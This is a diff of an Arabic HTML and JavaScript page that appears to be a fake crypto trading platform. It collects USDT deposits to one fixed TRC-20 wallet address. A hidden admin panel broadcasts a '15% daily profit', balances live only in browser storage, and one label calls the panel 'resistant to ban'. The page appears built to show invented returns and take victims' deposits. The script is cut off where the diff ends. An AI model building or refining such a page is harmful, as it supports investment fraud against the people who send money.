@@ -30,9 +30,9 @@
 </head>
 <body>
 
-    <!-- ==================== واجهة المستخدم ==================== -->
+    <!-- ==================== واجهة المستخدم الأساسية ==================== -->
     <div id="userInterface">
-        <!-- 👤 اسم العضو المحفوظ -->
+        <!-- 👤 اسم العضو المطور مع قفل الحفظ الثابت -->
         <div class="section-card">
             <div class="section-title">👤 اسم المستخدم الحالي:</div>
             <div id="currentUsernameText" style="font-size: 18px; font-weight: bold; color: #4fc3f7; margin-bottom:8px;">لاعب حقيقي</div>
@@ -48,14 +48,14 @@
             <div class="value-display">2500 دولار أمريكي</div>
         </div>
 
-        <!-- 🔗 طلب مكافأة دعوة -->
+        <!-- 🔗 تقديم طلب مكافأة دعوة -->
         <div class="section-card">
             <div class="section-title">🔗 طلب الحصول على مكافأة الدعوة:</div>
             <input type="text" id="inviteMemberName" placeholder="اسم العضو المدعو">
             <button class="btn-action btn-purple" onclick="sendInviteRequest()">📢 أرسل الطلب إلى مشرفك</button>
         </div>
 
-        <!-- 💰 الأرصدة الحية -->
+        <!-- 💰 الأرصدة التفاعلية الحية -->
         <div class="section-card">
             <div class="section-title">💰 إجمالي رأس المال:</div>
             <div class="value-display" id="displayCapital" style="color: #ffb74d;">USDT 0.00</div>
@@ -69,9 +69,9 @@
             <div class="value-display" id="displayInviteProfit" style="color: #00e676;">USDT 0.00</div>
         </div>
 
-        <!-- 🚨 لوحة عمليات السحب -->
+        <!-- 🚨 لوحة عمليات السحب الفورية -->
         <div class="section-card" style="border-color: #d32f2f;">
-            <div class="section-title" style="color: #ff5252;">🚨 لوحة عمليات السحب الفورية (TRC-20):</div>
+            <div class="section-title" style="color: #ff5252;">🚨 لوحة عمليات السحب الفورية (شبكة TRC-20):</div>
             <input type="number" id="withdrawAmount" placeholder="المبلغ بـ USDT">
             <input type="text" id="withdrawWallet" placeholder="أدخل عنوان محفظتك الشخصية TRC-20">
             <button class="btn-action btn-red" onclick="handleTransaction('سحب كلّي', 'withdrawAmount', 'withdrawWallet')">سحب كلّي</button>
@@ -82,23 +82,23 @@
         <div class="section-card" style="border-color: #f57c00;">
             <div class="section-title" style="color: #ffb74d;">📥 طلب إيداع رأس المال:</div>
             <div class="wallet-box" id="adminWalletAddress">TA1vsgrJEFy3YM6rkQWBppnZemFE6c9pBN</div>
-            <button class="btn-action" style="background-color: #334155; color: #fff; font-size: 12px; margin-bottom: 10px;" onclick="navigator.clipboard.writeText(document.getElementById('adminWalletAddress').innerText); alert('تم النسخ!')">📋 نسخ عنوان المحفظة</button>
+            <button class="btn-action" style="background-color: #334155; color: #fff; font-size: 12px; margin-bottom: 10px;" onclick="navigator.clipboard.writeText(document.getElementById('adminWalletAddress').innerText); alert('تم نسخ العنوان!')">📋 نسخ عنوان المحفظة</button>
             <input type="number" id="depositAmount" placeholder="أدخل المبلغ بعد التحويل">
             <button class="btn-action btn-orange" onclick="handleTransaction('إيداع', 'depositAmount', 'adminWalletAddress')">⚡ إرسال طلب الإيداع للمشرف</button>
         </div>
 
-        <!-- 📞 الدعم الفني -->
+        <!-- 📞 تواصل مع الدعم الفني عبر تليجرام -->
         <a href="https://t.me" target="_blank" class="btn-action btn-support">🚀 تواصل مع الدعم الفني عبر تليجرام</a>
 
-        <!-- 🔒 الزر السري للدخول إلى شاشة الأدمن داخل نفس الصفحة -->
-        <button class="btn-action btn-purple" style="margin-top: 30px; background-color: #212121; border: 1px dashed #444;" onclick="openAdminSection()">🔐 دخول لوحة تحكم المشرف (خاص بالادمن)</button>
+        <!-- 🔒 الزر السري للدخول إلى شاشة الأدمن -->
+        <button class="btn-action btn-purple" style="margin-top: 40px; background-color: #212121; border: 1px dashed #444;" onclick="openAdminSection()">🔐 دخول لوحة تحكم المشرف (خاص بالادمن)</button>
     </div>
 
-    <!-- ==================== لوحة تحكم المشرف السحرية المدمجة ==================== -->
+    <!-- ==================== لوحة تحكم المشرف المدمجة المقاومة للحظر ==================== -->
     <div id="adminSection" class="section-card" style="background-color: #121212; border: 2px solid #7b1fa2;">
         <div style="text-align: center; margin-bottom: 20px;">
             <h2 style="color: #ffd600; margin: 0;">🛠️ لوحة المشرف المباشرة الثابتة</h2>
-            <p style="color: #aaa; font-size: 12px; margin: 5px 0;">الطلبات والاتصال يعمل داخلياً 100% بدون انقطاع</p>
+            <p style="color: #aaa; font-size: 12px; margin: 5px 0;">نظام مستقل آمن ومقاوم للإنفصال والحظر البرمجي 100%</p>
         </div>
 
         <button class="btn-action btn-gold" onclick="broadcastTodayProfit()">📊 بث أرباح الصفقة اليومية (نسبة 15%)</button>
@@ -111,7 +111,7 @@
     </div>
 
 <script>
-    // نظام الحفظ المباشر في المتصفح لمنع أخطاء السيرفرات السحابية وانفصال الشبكة
+    // تهيئة البيانات المحلية لمنع الانفصال الأمني
     if(!localStorage.getItem('global_orders')) localStorage.setItem('global_orders', JSON.stringify([]));
     if(!localStorage.getItem('global_balances')) localStorage.setItem('global_balances', JSON.stringify({ capital: 0, todayProfit: 0, inviteProfit: 0 }));
 
@@ -144,7 +144,7 @@
         const wallet = walletId === 'adminWalletAddress' ? document.getElementById(walletId).innerText : document.getElementById(walletId).value;
         const currentUser = localStorage.getItem('saved_user_name') || 'لاعب حقيقي';
 
-        if(!amount || !wallet) return alert('يرجى ملء كافة البيانات الحقول المطلوبة.');
+        if(!amount || !wallet) return alert('يرجى ملء الحقول المطلوبة.');
 
         const newRequest = {
             id: Date.now(),
@@ -156,5 +156,4 @@
             date: new Date().toLocaleString('ar-EG')
         };
 
-        let orders = JSON.parse(localStorage.getItem('global_orders'));
-        
+    
